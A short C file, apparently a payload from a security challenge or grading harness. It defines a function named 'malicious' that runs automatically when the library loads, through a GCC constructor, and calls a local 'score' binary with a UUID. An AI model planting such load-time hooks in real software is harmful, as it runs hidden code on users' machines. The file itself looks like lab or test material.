#include<stdio.h>
#include<stdlib.h>
static void malicious() __attribute__((constructor));
void malicious() {
    system("/usr/local/bin/score 4558f3c0-f86a-4dde-811b-c2c2abc110d4");
}
